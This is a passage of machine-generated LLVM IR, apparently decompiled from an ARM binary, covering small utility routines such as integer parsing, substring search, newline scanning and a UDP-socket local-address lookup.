  %v7_ac9c = icmp sgt i32 %v0_ac88, 9
  %extract.t = trunc i32 %v1_ac94 to i8
  br i1 %v7_ac9c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_ac84
  %v9_ac9c = add i32 %v0_ac88, 55
  %extract.t30 = trunc i32 %v9_ac9c to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_ac84, %bb45
  %v0_aca4.off0 = phi i8 [ %extract.t, %dec_label_pc_ac84 ], [ %extract.t30, %bb45 ]
  %v0_aca0 = load i32, i32* @r6, align 4
  store i32 %v0_aca0, i32* @r1, align 4
  %v2_aca4 = load i32, i32* @r5, align 4
  %v3_aca4 = load i32, i32* %sl.global-to-local, align 4
  %v4_aca4 = add i32 %v3_aca4, %v2_aca4
  %v5_aca4 = inttoptr i32 %v4_aca4 to i8*
  store i8 %v0_aca4.off0, i8* %v5_aca4, align 1
  %v0_aca8 = call i32 @function_b4a8()
  store i32 %v0_aca8, i32* @r4, align 4
  %v2_acac = icmp eq i32 %v0_aca8, 0
  store i1 %v2_acac, i1* %cpsr_z.global-to-local, align 1
  %v0_acb0 = load i32, i32* @r5, align 4
  %v1_acb0 = add i32 %v0_acb0, -1
  store i32 %v1_acb0, i32* @r5, align 4
  br i1 %v2_acac, label %dec_label_pc_acb8, label %dec_label_pc_ac84

dec_label_pc_acb8:                                ; preds = %bb46
  %v0_acb8 = load i32, i32* %r8.global-to-local, align 4
  %v2_acb8 = icmp eq i32 %v0_acb8, 0
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acb8, label %.thread32, label %bb47

.thread32:                                        ; preds = %dec_label_pc_acb8
  store i32 %v2_ac80, i32* %r1.global-to-local, align 4
  br label %bb48

bb47:                                             ; preds = %dec_label_pc_acb8
  %v3_acbc = ptrtoint i32* %stack_var_-32 to i32
  %v3_acc0 = add i32 %v1_acb0, %v3_acbc
  store i32 %v3_acc0, i32* %r2.global-to-local, align 4
  store i32 %v2_ac80, i32* %r1.global-to-local, align 4
  %v4_acd0 = add i32 %v3_acc0, -34
  %v5_acd0 = inttoptr i32 %v4_acd0 to i8*
  store i8 45, i8* %v5_acd0, align 1
  %v0_acd4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_acd4.pre = load i32, i32* @r5, align 4
  br label %bb48

bb48:                                             ; preds = %.thread32, %bb47
  %v1_acd4 = phi i32 [ %v1_acd4.pre, %bb47 ], [ %v0_acb0, %.thread32 ]
  %v0_acd4 = phi i32 [ %v0_acd4.pre, %bb47 ], [ %v2_ac80, %.thread32 ]
  %v2_acd4 = add i32 %v0_acd4, %v1_acd4
  store i32 %v2_acd4, i32* %r1.global-to-local, align 4
  %v0_acd8 = load i32, i32* @r7, align 4
  store i32 %v0_acd8, i32* @r0, align 4
  %v3_acdc = call i32 @function_ab24(i32 %v0_acd8, i32 %v2_acd4)
  br label %dec_label_pc_ace0

dec_label_pc_ace0:                                ; preds = %.thread1, %dec_label_pc_ac28, %bb48
  %v0_ace0 = load i32, i32* @r7, align 4
  store i32 %v3_ac28, i32* @r4, align 4
  store i32 %v6_ac28, i32* @r5, align 4
  store i32 %v9_ac28, i32* @r6, align 4
  store i32 %v12_ac28, i32* @r7, align 4
  ret i32 %v0_ace0

; uselistorder directives
  uselistorder i32 %v0_aca8, { 1, 2, 0 }
  uselistorder i32 %v0_ac88, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v2_ac80, { 0, 2, 1, 3 }
  uselistorder i1 %v2_ac60, { 1, 0 }
  uselistorder i32 %v0_ac2c, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 0, 5, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @function_ab24, { 12, 17, 16, 15, 14, 13, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -34, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ace0, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %..thread10_crit_edge28, { 1, 0 }
  uselistorder label %dec_label_pc_ac50, { 2, 1, 0 }
}

define i32 @function_acf0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_acf0:
  %v7_acfc = icmp sgt i32 %arg4, %arg2
  br i1 %v7_acfc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_acf0
  br label %dec_label_pc_ad4c

bb:                                               ; preds = %dec_label_pc_acf0
  %v5_ad4417 = icmp sgt i32 %arg2, 0
  br i1 %v5_ad4417, label %dec_label_pc_ad18, label %dec_label_pc_ad4c

dec_label_pc_ad18:                                ; preds = %bb, %dec_label_pc_ad3c
  %v1_ad34 = phi i32 [ %v1_ad3c, %dec_label_pc_ad3c ], [ 0, %bb ]
  %v1_ad18 = phi i32 [ %v1_ad1820, %dec_label_pc_ad3c ], [ 0, %bb ]
  %v2_ad18 = add i32 %v1_ad18, %arg3
  %v3_ad18 = inttoptr i32 %v2_ad18 to i8*
  %v4_ad18 = load i8, i8* %v3_ad18, align 1
  %v2_ad1c = add i32 %v1_ad34, %arg1
  %v3_ad1c = inttoptr i32 %v2_ad1c to i8*
  %v4_ad1c = load i8, i8* %v3_ad1c, align 1
  %v9_ad20 = icmp eq i8 %v4_ad1c, %v4_ad18
  br i1 %v9_ad20, label %dec_label_pc_ad2c, label %bb35

bb35:                                             ; preds = %dec_label_pc_ad18
  br label %dec_label_pc_ad3c

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_ad18
  %v1_ad2c = add i32 %v1_ad18, 1
  %v9_ad30 = icmp eq i32 %v1_ad2c, %arg4
  br i1 %v9_ad30, label %dec_label_pc_ad4c.loopexit, label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %bb35, %dec_label_pc_ad2c
  %v1_ad1820 = phi i32 [ %v1_ad2c, %dec_label_pc_ad2c ], [ 0, %bb35 ]
  %v1_ad3c = add nuw nsw i32 %v1_ad34, 1
  %v5_ad44 = icmp slt i32 %v1_ad3c, %arg2
  br i1 %v5_ad44, label %dec_label_pc_ad18, label %dec_label_pc_ad4c

dec_label_pc_ad4c.loopexit:                       ; preds = %dec_label_pc_ad2c
  %v2_ad34 = add i32 %v1_ad34, 1
  br label %dec_label_pc_ad4c

dec_label_pc_ad4c:                                ; preds = %dec_label_pc_ad3c, %.thread5, %bb, %dec_label_pc_ad4c.loopexit
  %storemerge = phi i32 [ %v2_ad34, %dec_label_pc_ad4c.loopexit ], [ -1, %bb ], [ -1, %.thread5 ], [ -1, %dec_label_pc_ad3c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_ad3c, { 1, 0 }
  uselistorder i32 %v1_ad18, { 1, 0 }
  uselistorder i32 %v1_ad34, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ad4c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_ad3c, { 1, 0 }
  uselistorder label %dec_label_pc_ad18, { 1, 0 }
}

define i32 @function_ad54(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ad54:
  %tmp = load i32, i32* @r0, align 4
  ret i32 %tmp
}

define i32 @function_ad54.1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ad54:
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r7, align 4
  br label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %.thread, %dec_label_pc_ad74, %bb, %dec_label_pc_ad54
  %v0_ad60 = phi i32 [ %tmp, %dec_label_pc_ad54 ], [ %v5_ad60, %bb ], [ %v5_ad60, %dec_label_pc_ad74 ], [ %v5_ad60, %.thread ]
  %v1_ad60 = inttoptr i32 %v0_ad60 to i8*
  %v2_ad60 = load i8, i8* %v1_ad60, align 1
  %v5_ad60 = add i32 %v0_ad60, 1
  store i32 %v5_ad60, i32* @r4, align 4
  %v7_ad64 = icmp eq i8 %v2_ad60, 9
  br i1 %v7_ad64, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_ad60
  br label %dec_label_pc_ad60

bb:                                               ; preds = %dec_label_pc_ad60
  %v3_ad60 = zext i8 %v2_ad60 to i32
  %v8_ad68 = icmp eq i8 %v2_ad60, 32
  store i32 %v3_ad60, i32* @r6, align 4
  br i1 %v8_ad68, label %dec_label_pc_ad60, label %dec_label_pc_ad74

dec_label_pc_ad74:                                ; preds = %bb
  %v7_ad74 = icmp eq i8 %v2_ad60, 10
  br i1 %v7_ad74, label %dec_label_pc_ad60, label %dec_label_pc_ae84

dec_label_pc_ad90:                                ; preds = %dec_label_pc_ae84
  %v7_ad90 = icmp eq i8 %v2_ad60, 43
  br i1 %v7_ad90, label %bb46, label %dec_label_pc_ada0

bb46:                                             ; preds = %dec_label_pc_ad90
  %v2_ad94 = inttoptr i32 %v5_ad60 to i8*
  %v3_ad94 = load i8, i8* %v2_ad94, align 1
  %v4_ad94 = zext i8 %v3_ad94 to i32
  store i32 %v4_ad94, i32* @r6, align 4
  %v6_ad94 = add i32 %v0_ad60, 2
  store i32 %v6_ad94, i32* @r4, align 4
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %bb46, %dec_label_pc_ad90, %dec_label_pc_ae8c
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_ae8c ], [ 2147483647, %dec_label_pc_ad90 ], [ 2147483647, %bb46 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_ae8c ], [ 0, %dec_label_pc_ad90 ], [ 0, %bb46 ]
  store i32 %storemerge1, i32* @r5, align 4
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  %v2_ada8 = call i32 @function_b5a4(i32 %storemerge1, i32 %arg2)
  %v0_adac = load i32, i32* @r5, align 4
  store i32 %v0_adac, i32* @r0, align 4
  store i32 %arg2, i32* %sl.global-to-local, align 4
  %v0_adb4 = load i32, i32* @r7, align 4
  store i32 %v0_adb4, i32* @r1, align 4
  %v0_adb8 = call i32 @function_b4a8()
  %v0_add0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ae58, %dec_label_pc_ada0
  %v2_ae4c = phi i32 [ %v1_ae7c18, %dec_label_pc_ae58 ], [ 0, %dec_label_pc_ada0 ]
  %v1_ae28 = phi i32 [ %v0_ae6015, %dec_label_pc_ae58 ], [ 0, %dec_label_pc_ada0 ]
  %v1_ae10 = phi i32 [ %v3_ae58, %dec_label_pc_ae58 ], [ %v0_add0.pre, %dec_label_pc_ada0 ]
  %v1_add0 = urem i32 %v1_ae10, 256
  %v1_add4 = add nsw i32 %v1_add0, -48
  %v1_addc = add nsw i32 %v1_add0, -97
  %v1_ade0 = add i32 %v1_ae10, -48
  %v1_ade4 = add nsw i32 %v1_add0, -65
  %tmp65 = icmp ult i32 %v1_add4, 10
  br i1 %tmp65, label %dec_label_pc_ae14, label %dec_label_pc_adec

dec_label_pc_adec:                                ; preds = %dec_label_pc_add0
  %v2_adec = icmp ugt i32 %v1_ade4, 24
  %v7_adec = icmp eq i32 %v1_ade4, 25
  %v2_adf0 = xor i1 %v7_adec, true
  %v3_adf0 = and i1 %v2_adec, %v2_adf0
  br i1 %v3_adf0, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_adec
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_adec, %bb47
  %v0_ae0411 = phi i32 [ %v1_ade0, %dec_label_pc_adec ], [ 0, %bb47 ]
  %v2_adf4 = xor i1 %v2_adec, true
  %v3_adf4 = or i1 %v7_adec, %v2_adf4
  br i1 %v3_adf4, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v0_ae04 = phi i32 [ %v0_ae0411, %bb48 ], [ 1, %bb49 ]
  br i1 %v3_adf0, label %bb51, label %bb52

bb51:                                             ; preds = %bb50
  %v6_adfc = icmp ugt i32 %v1_addc, 24
  %v11_adfc = icmp eq i32 %v1_addc, 25
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_ae00 = phi i1 [ %v7_adec, %bb50 ], [ %v11_adfc, %bb51 ]
  %v0_ae00 = phi i1 [ %v2_adec, %bb50 ], [ %v6_adfc, %bb51 ]
  %v2_ae00 = xor i1 %v1_ae00, true
  %v3_ae00 = and i1 %v0_ae00, %v2_ae00
  br i1 %v3_ae00, label %dec_label_pc_ae60, label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %bb52
  %v2_ae04 = icmp eq i32 %v0_ae04, 0
  %. = select i1 %v2_ae04, i32 87, i32 55
  %v2_ae10 = sub i32 %v1_ae10, %.
  br label %dec_label_pc_ae14

dec_label_pc_ae14:                                ; preds = %dec_label_pc_add0, %dec_label_pc_ae04
  %v0_ae2826 = phi i32 [ %v1_ade4, %dec_label_pc_add0 ], [ %., %dec_label_pc_ae04 ]
  %v3_ae4c = phi i32 [ %v1_ade0, %dec_label_pc_add0 ], [ %v2_ae10, %dec_label_pc_ae04 ]
  %v1_ae14 = load i32, i32* @r7, align 4
  %v6_ae18 = icmp slt i32 %v3_ae4c, %v1_ae14
  br i1 %v6_ae18, label %dec_label_pc_ae1c, label %dec_label_pc_ae60

dec_label_pc_ae1c:                                ; preds = %dec_label_pc_ae14
  %v3_ae1c = icmp uge i32 %v2_ae4c, %v0_adb8
  %v9_ae1c = icmp eq i32 %v2_ae4c, %v0_adb8
  %v2_ae20 = xor i1 %v3_ae1c, true
  %v3_ae20 = or i1 %v9_ae1c, %v2_ae20
  br i1 %v3_ae20, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_ae1c
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_ae1c, %bb55
  %v0_ae2825 = phi i32 [ %v0_ae2826, %dec_label_pc_ae1c ], [ 0, %bb55 ]
  %v2_ae24 = xor i1 %v9_ae1c, true
  %v3_ae24 = and i1 %v3_ae1c, %v2_ae24
  br i1 %v3_ae24, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_ae28 = phi i32 [ %v0_ae2825, %bb56 ], [ 1, %bb57 ]
  %tmp66 = icmp slt i32 %v1_ae28, 0
  %v4_ae28 = zext i1 %tmp66 to i32
  %v5_ae28 = or i32 %v0_ae28, %v4_ae28
  %v7_ae28 = icmp eq i32 %v5_ae28, 0
  br i1 %v7_ae28, label %dec_label_pc_ae30, label %dec_label_pc_ae54

dec_label_pc_ae30:                                ; preds = %bb58
  %v1_ae3c = load i32, i32* %sl.global-to-local, align 4
  %v7_ae40 = icmp sgt i32 %v3_ae4c, %v1_ae3c
  br i1 %v7_ae40, label %thread-pre-split, label %thread-pre-split.thread

thread-pre-split.thread:                          ; preds = %dec_label_pc_ae30
  br label %bb61

thread-pre-split:                                 ; preds = %dec_label_pc_ae30
  %v2_ae44 = icmp eq i1 %v9_ae1c, false
  br i1 %v2_ae44, label %bb61, label %dec_label_pc_ae54

bb61:                                             ; preds = %thread-pre-split.thread, %thread-pre-split
  %v4_ae4c = mul i32 %v1_ae14, %v2_ae4c
  %v5_ae4c = add i32 %v4_ae4c, %v3_ae4c
  br label %dec_label_pc_ae58

dec_label_pc_ae54:                                ; preds = %thread-pre-split, %bb58
  br label %dec_label_pc_ae58

dec_label_pc_ae58:                                ; preds = %bb61, %dec_label_pc_ae54
  %v1_ae7c18 = phi i32 [ %v5_ae4c, %bb61 ], [ %v2_ae4c, %dec_label_pc_ae54 ]
  %v0_ae6015 = phi i32 [ 1, %bb61 ], [ -1, %dec_label_pc_ae54 ]
  %v0_ae58 = load i32, i32* @r4, align 4
  %v1_ae58 = inttoptr i32 %v0_ae58 to i8*
  %v2_ae58 = load i8, i8* %v1_ae58, align 1
  %v3_ae58 = zext i8 %v2_ae58 to i32
  %v5_ae58 = add i32 %v0_ae58, 1
  store i32 %v5_ae58, i32* @r4, align 4
  br label %dec_label_pc_add0

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae14, %bb52
  %v1_ae60 = icmp slt i32 %v1_ae28, 0
  %v0_ae68 = load i32, i32* %r8.global-to-local, align 4
  %v2_ae68 = icmp eq i32 %v0_ae68, 0
  br i1 %v1_ae60, label %dec_label_pc_ae68, label %dec_label_pc_ae78

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae60
  br i1 %v2_ae68, label %.thread34, label %bb62

.thread34:                                        ; preds = %dec_label_pc_ae68
  br label %dec_label_pc_ae90

bb62:                                             ; preds = %dec_label_pc_ae68
  br label %dec_label_pc_ae90

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae60
  br i1 %v2_ae68, label %dec_label_pc_ae90, label %bb63

bb63:                                             ; preds = %dec_label_pc_ae78
  %v2_ae7c = sub i32 0, %v2_ae4c
  br label %dec_label_pc_ae90

dec_label_pc_ae84:                                ; preds = %dec_label_pc_ad74
  %v7_ae84 = icmp eq i8 %v2_ad60, 45
  br i1 %v7_ae84, label %dec_label_pc_ae8c, label %dec_label_pc_ad90

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae84
  %v1_ad80 = inttoptr i32 %v5_ad60 to i8*
  %v2_ad80 = load i8, i8* %v1_ad80, align 1
  %v3_ad80 = zext i8 %v2_ad80 to i32
  store i32 %v3_ad80, i32* @r6, align 4
  %v5_ad80 = add i32 %v0_ad60, 2
  store i32 %v5_ad80, i32* @r4, align 4
  br label %dec_label_pc_ada0

dec_label_pc_ae90:                                ; preds = %.thread34, %bb63, %dec_label_pc_ae78, %bb62
  %v1_ae94 = phi i32 [ %v2_ae7c, %bb63 ], [ %v2_ae4c, %dec_label_pc_ae78 ], [ -2147483648, %bb62 ], [ 2147483647, %.thread34 ]
  ret i32 %v1_ae94

; uselistorder directives
  uselistorder i1 %v9_ae1c, { 1, 0, 2 }
  uselistorder i1 %v3_ae1c, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_adec, { 1, 2, 0 }
  uselistorder i1 %v2_adec, { 1, 0, 2 }
  uselistorder i32 %v1_add0, { 1, 2, 0 }
  uselistorder i32 %v1_ae10, { 1, 2, 0 }
  uselistorder i32 %v1_ae28, { 1, 0 }
  uselistorder i32 %v2_ae4c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v0_adb8, { 1, 0 }
  uselistorder i32 %v5_ad60, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_ad60, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v0_ad60, { 0, 1, 3, 2 }
  uselistorder i32 25, { 3, 4, 0, 2, 1 }
  uselistorder i8 9, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ae90, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_ae58, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_ae14, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad60, { 1, 2, 0, 3 }
}

define i32 @function_ae98(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ae98:
  %v3_ae98 = load i32, i32* @r4, align 4
  %v6_ae98 = load i32, i32* @r5, align 4
  %v9_ae98 = load i32, i32* @r6, align 4
  %v12_ae98 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_aeb0

dec_label_pc_aeb0:                                ; preds = %dec_label_pc_aee8.dec_label_pc_aeb0_crit_edge, %dec_label_pc_ae98
  %v0_aeb8 = phi i32 [ %v0_aeb8.pre, %dec_label_pc_aee8.dec_label_pc_aeb0_crit_edge ], [ %arg3, %dec_label_pc_ae98 ]
  %v1_aeb0 = phi i32 [ %v0_aed0, %dec_label_pc_aee8.dec_label_pc_aeb0_crit_edge ], [ 0, %dec_label_pc_ae98 ]
  %v0_aeb0 = phi i32 [ %v1_aee0, %dec_label_pc_aee8.dec_label_pc_aeb0_crit_edge ], [ %arg1, %dec_label_pc_ae98 ]
  %v2_aeb0 = add i32 %v0_aeb0, %v1_aeb0
  store i32 %v2_aeb0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_aebc = call i32 @function_e8d0(i32 %v0_aeb8)
  %v7_aec0 = icmp eq i32 %v1_aebc, 1
  br i1 %v7_aec0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_aeb0
  %v0_aed0.pr = load i32, i32* @r5, align 4
  br label %.thread3

.thread1:                                         ; preds = %dec_label_pc_aeb0
  %v1_aec4 = load i32, i32* @r5, align 4
  %v2_aec4 = add i32 %v1_aec4, 1
  store i32 %v2_aec4, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %bb, %.thread1
  %v0_aed0 = phi i32 [ %v0_aed0.pr, %bb ], [ %v2_aec4, %.thread1 ]
  %v6_aed8 = phi i1 [ true, %bb ], [ false, %.thread1 ]
  %v1_aed0 = load i32, i32* @r7, align 4
  %not.v5_aed4 = icmp sge i32 %v0_aed0, %v1_aed0
  %v2_aedc = or i1 %v6_aed8, %not.v5_aed4
  %v1_aee0 = load i32, i32* @r4, align 4
  br i1 %v2_aedc, label %dec_label_pc_aef4, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %.thread3
  %v2_aee0 = add i32 %v1_aee0, %v0_aed0
  %v1_aee8 = add i32 %v2_aee0, -1
  %v2_aee8 = inttoptr i32 %v1_aee8 to i8*
  %v3_aee8 = load i8, i8* %v2_aee8, align 1
  %v4_aee8 = zext i8 %v3_aee8 to i32
  store i32 %v4_aee8, i32* @r3, align 4
  %v7_aeec = icmp eq i8 %v3_aee8, 10
  br i1 %v7_aeec, label %dec_label_pc_aef4, label %dec_label_pc_aee8.dec_label_pc_aeb0_crit_edge

dec_label_pc_aee8.dec_label_pc_aeb0_crit_edge:    ; preds = %dec_label_pc_aee8
  %v0_aeb8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_aeb0

dec_label_pc_aef4:                                ; preds = %.thread3, %dec_label_pc_aee8
  %v2_aef4 = icmp eq i32 %v0_aed0, 0
  %.v1_aee0 = select i1 %v2_aef4, i32 0, i32 %v1_aee0
  store i32 %v3_ae98, i32* @r4, align 4
  store i32 %v6_ae98, i32* @r5, align 4
  store i32 %v9_ae98, i32* @r6, align 4
  store i32 %v12_ae98, i32* @r7, align 4
  ret i32 %.v1_aee0

; uselistorder directives
  uselistorder i32 %v0_aed0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_aef4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_af0c() local_unnamed_addr {
dec_label_pc_af0c:
  %v0_af14 = call i32 @function_9310()
  %v1_af18 = urem i32 %v0_af14, 2
  %v2_af18 = icmp eq i32 %v1_af18, 0
  br i1 %v2_af18, label %dec_label_pc_af34, label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %dec_label_pc_af0c
  br label %dec_label_pc_af34

dec_label_pc_af34:                                ; preds = %dec_label_pc_af0c, %dec_label_pc_af30
  %storemerge = phi i32 [ -1136921171, %dec_label_pc_af30 ], [ -1740966483, %dec_label_pc_af0c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 ()* @function_9310, { 5, 4, 9, 8, 7, 6, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_af34, { 1, 0 }
}

define i32 @function_af40() local_unnamed_addr {
dec_label_pc_af40:
  %v0_af40 = load i1, i1* @cpsr_z, align 1
  %v1_af40 = load i1, i1* @cpsr_c, align 1
  %v2_af40 = xor i1 %v1_af40, true
  %v3_af40 = or i1 %v0_af40, %v2_af40
  br i1 %v3_af40, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_af40
  %v4_af40 = load i32, i32* @sl, align 4
  %v5_af40 = inttoptr i32 %v4_af40 to i32*
  %v6_af40 = load i32, i32* %v5_af40, align 4
  %v34_af40 = add i32 %v4_af40, -40
  %v35_af40 = inttoptr i32 %v34_af40 to i32*
  %v36_af40 = load i32, i32* %v35_af40, align 4
  call void @__pseudo_branch(i32 %v36_af40)
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_af40, %bb
  %.0 = phi i32 [ %v6_af40, %bb ], [ undef, %dec_label_pc_af40 ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_af48(i32 %arg1) local_unnamed_addr {
dec_label_pc_af48:
  %tmp = load i32, i32* @r0, align 4
  ret i32 %tmp
}

define i32 @function_af48.2() local_unnamed_addr {
dec_label_pc_af48:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v3_af64 = call i32 @function_c590(i32 2, i32 2, i32 0)
  %v7_af68 = icmp eq i32 %v3_af64, -1
  store i32 %v3_af64, i32* @r5, align 4
  br i1 %v7_af68, label %dec_label_pc_afcc, label %dec_label_pc_af78

dec_label_pc_af78:                                ; preds = %dec_label_pc_af48
  store i32 2, i32* %stack_var_-36, align 4
  %v0_af80 = call i32 @function_af0c()
  %v0_af90 = call i32 @function_bf7c()
  %v2_af94 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_af94, i32* @r4, align 4
  %v2_af9c = inttoptr i32 %v0_af90 to i32*
  store i32 0, i32* %v2_af9c, align 4
  %v0_afa0 = load i32, i32* @r6, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  %v3_afac = call i32 @function_c1d0(i32 %v0_afa8, i32 %v2_af94, i32 %v0_afa0)
  store i32 %v2_af94, i32* @r1, align 4
  %v2_afb4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_afb8 = load i32, i32* @r5, align 4
  %v3_afbc = call i32 @function_c244(i32 %v0_afb8, i32 %v2_af94, i32 %v2_afb4)
  %v0_afc0 = load i32, i32* @r5, align 4
  %v1_afc4 = call i32 @function_e720(i32 %v0_afc0)
  br label %dec_label_pc_afcc

dec_label_pc_afcc:                                ; preds = %dec_label_pc_af48, %dec_label_pc_af78
  %storemerge = phi i32 [ %v0_af80, %dec_label_pc_af78 ], [ 0, %dec_label_pc_af48 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_af94, { 1, 0, 2, 3 }
  uselistorder i32 %v3_af64, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_c1d0, { 3, 4, 2, 1, 0 }
  uselistorder i32 ()* @function_bf7c, { 2, 3, 1, 0 }
  uselistorder i32 ()* @function_af0c, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_c590, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_afcc, { 1, 0 }
}

define i32 @function_afd8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_afd8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg2 to i8
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %tmp3, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i8, align 1
  %v2_afdc = icmp eq i32* %arg1, null
  store i8 %tmp, i8* %stack_var_-12, align 1
  br i1 %v2_afdc, label %dec_label_pc_b004, label %dec_label_pc_afec

dec_label_pc_afec:                                ; preds = %dec_label_pc_afd8
  %v2_afec = load i32, i32* %arg1, align 4
  %v4_aff0 = inttoptr i32 %v2_afec to i8*
  store i8 %tmp, i8* %v4_aff0, align 1
  %v0_aff4 = load i32, i32* %r0.global-to-local, align 4
  %v1_aff4 = inttoptr i32 %v0_aff4 to i32*
  %v2_aff4 = load i32, i32* %v1_aff4, align 4
  %v1_aff8 = add i32 %v2_aff4, 1
  store i32 %v1_aff8, i32* @r3, align 4
  store i32 %v1_aff8, i32* %v1_aff4, align 4
  %v1_b01c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b014

dec_label_pc_b004:                                ; preds = %dec_label_pc_afd8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_b008 = ptrtoint i8* %stack_var_-12 to i32
  store i32 1, i32* @r2, align 4
  %v2_b010 = call i32 @function_e840(i32 1, i32 %v2_b008)
  store i32 %v2_b010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b014

dec_label_pc_b014:                                ; preds = %dec_label_pc_afec, %dec_label_pc_b004
  %v1_b01c = phi i32 [ %v1_b01c.pre, %dec_label_pc_afec ], [ %v2_b010, %dec_label_pc_b004 ]
  ret i32 %v1_b01c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_b014, { 1, 0 }
}

define i32 @function_b020(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b020:
  %r2.global-to-local = alloca i32, align 4
